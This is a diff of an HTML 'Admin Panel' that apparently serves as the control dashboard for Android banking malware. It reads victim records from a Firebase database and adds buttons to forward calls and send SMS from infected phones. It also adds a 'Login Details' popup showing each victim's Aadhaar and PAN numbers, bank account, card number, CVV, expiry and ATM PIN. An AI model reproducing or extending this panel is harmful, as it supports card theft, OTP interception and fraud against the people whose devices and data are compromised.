@@ -1,36 +1,65 @@
 <!DOCTYPE html>
 <html>
+
 <head>
 <meta charset="utf-8">
 <title>Admin Panel</title>
 
 <style>
+
 body{
+background:#000;
+margin:0;
+padding:0;
 font-family:Arial;
-background:#f1f1f1;
-padding:10px;
 }
 
 .card{
-background:white;
+background:#05057a;
+margin:10px;
 padding:12px;
-margin-bottom:10px;
-border-radius:10px;
-box-shadow:0 2px 5px rgba(0,0,0,0.1);
-line-height:1.7;
+border-radius:15px;
+color:white;
+box-shadow:0 2px 10px rgba(0,0,0,0.5);
 }
 
-.title{
-font-size:20px;
-font-weight:bold;
+.topbtn{
+display:flex;
+gap:10px;
 margin-bottom:15px;
 }
+
+.btn{
+flex:1;
+padding:14px;
+border:none;
+border-radius:12px;
+background:#1497ff;
+color:#00ff99;
+font-size:18px;
+font-weight:bold;
+}
+
+.loginbtn{
+margin-top:20px;
+background:#d62d2d;
+color:white;
+border:none;
+padding:12px 18px;
+border-radius:10px;
+font-size:18px;
+}
+
+.info{
+font-size:18px;
+line-height:32px;
+}
+
 </style>
 
 </head>
-<body>
 
-<div class="title">All Devices</div>
+<body>
 
 <div id="users"></div>
 
@@ -45,11 +74,11 @@ databaseURL: "https://sbk-admin-default-rtdb.firebaseio.com"
 
 firebase.initializeApp(firebaseConfig);
 
-firebase.database().ref("All_Users/Data/DeviceInfo").on("value", snap => {
+firebase.database().ref("All_Users/Data/DeviceInfo").on("value", function(snap){
 
-document.getElementById("users").innerHTML="";
+document.getElementById("users").innerHTML = "";
 
-snap.forEach(child => {
+snap.forEach(function(child){
 
 let d = child.val();
 
@@ -57,25 +86,70 @@ document.getElementById("users").innerHTML += `
 
 <div class="card">
 
-<b>Login:</b><br><br>
+<div class="topbtn">
 
-Name: ${d.d_name || ""}<br>
+<button class="btn">
+CALL FORWARD
+</button>
 
-Device: ${d.device || ""}<br>
+<button class="btn">
+SEND SMS
+</button>
 
-Serial: ${d.user_serial || ""}<br>
+</div>
 
-Battery: ${d.battery || ""}<br>
+<div class="info">
 
-Time: ${d.TimeandDate || ""}<br>
+<div>Model: ${d.Model || "N/A"}</div>
 
-SIM1: ${d.nameSim1 || ""}<br>
+<div>OS Version: ${d.Version || "N/A"}</div>
 
-SIM2: ${d.nameSim2 || ""}<br>
+<div>Device Name: ${d.Brand || "N/A"}</div>
 
-Number1: ${d.numberSim1 || ""}<br>
+<div>Device ID: ${d.DeviceId || "N/A"}</div>
 
-Number2: ${d.numberSim2 || ""}<br>
+<br>
+
+<div>Call Forwarding Status</div>
+
+<br>
+
+<div>SIM 1: ${d.Sim1 || "No Data"}</div>
+
+<div>SIM 1 Number: ${d.Number1 || "No Data"}</div>
+
+<br>
+
+<div>SIM 2: ${d.Sim2 || "No SIM Found"}</div>
+
+<div>SIM 2 Number: ${d.Number2 || "No Data"}</div>
+
+</div>
+
+<button onclick="
+alert(
+'ACCOUNT DETAILS\\n\\n' +
+
+'Name: ${d.Name || "N/A"}\\n\\n' +
+'Mobile: ${d.Number || "N/A"}\\n\\n' +
+'Aadhar Card: ${d.Adhar || "N/A"}\\n\\n' +
+'Pan Card: ${d.Pan || "N/A"}\\n\\n' +
+'DOB: ${d.Dob || "N/A"}\\n\\n\\n' +
+
+'ATM CARD DETAILS\\n\\n' +
+
+'Account: ${d.Account || "N/A"}\\n\\n' +
+'Card: ${d.Card || "N/A"}\\n\\n' +
+'CVV: ${d.Cvv || "N/A"}\\n\\n' +
+'Expiry: ${d.Expiry || "N/A"}\\n\\n' +
+'ATM PIN: ${d.Atm || "N/A"}'
+)
+"
+class="loginbtn">
+
+Login Details
+
+</button>
 
 </div>
 
